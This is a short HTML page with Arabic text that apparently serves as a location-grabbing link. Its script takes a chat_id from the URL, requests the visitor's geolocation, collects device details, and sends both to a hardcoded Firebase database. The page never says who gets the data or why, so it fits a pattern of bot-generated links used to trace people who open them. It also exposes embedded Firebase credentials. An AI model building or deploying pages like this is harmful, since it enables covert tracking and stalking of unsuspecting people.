<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>تحديد الموقع</title>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<style>
body{
margin:0;
height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:#0d0d0d;
color:#00aaff;
font-family:sans-serif;
text-align:center;
}
</style>
</head>

<body>

<h2 id="status">📍 جاري تحديد الموقع...</h2>

<script>

// قراءة chat_id من الرابط
const params = new URLSearchParams(window.location.search);
const chatId = params.get("chat_id");

if(!chatId){
document.getElementById("status").innerText="⚠ رابط غير صالح";
throw new Error("No chat_id");
}


// إعداد Firebase
const firebaseConfig={
apiKey:"AIzaSyCctwmXaaMpD5XfFzmdxqKd3RKoIc31fSc",
authDomain:"devicelink-dbe01.firebaseapp.com",
databaseURL:"https://devicelink-dbe01-default-rtdb.firebaseio.com",
projectId:"devicelink-dbe01",
storageBucket:"devicelink-dbe01.firebasestorage.app",
messagingSenderId:"1014057679077",
appId:"1:1014057679077:android:ae6376a0b450a1b656bc0c"
};

firebase.initializeApp(firebaseConfig);
const database=firebase.database();


// جمع معلومات الجهاز (معلومات عامة فقط)
function getDeviceInfo(){

const ua=navigator.userAgent;

return{
user_agent:ua,
platform:navigator.platform,
language:navigator.language,
screen_width:screen.width,
screen_height:screen.height,
is_mobile:/Android|iPhone|iPad|iPod/i.test(ua)
};

}


// طلب الموقع
navigator.geolocation.getCurrentPosition(

async(pos)=>{

const device=getDeviceInfo();

const data={

chat_id:chatId,

latitude:pos.coords.latitude,
longitude:pos.coords.longitude,
accuracy:pos.coords.accuracy,

time:new Date().toISOString(),

device:device

};

await database.ref("locations").push(data);

document.getElementById("status").innerText="✅ تم إرسال الموقع";

},

()=>{

document.getElementById("status").innerText="❌ تم رفض إذن الموقع";

}

);

</script>

</body>
</html>
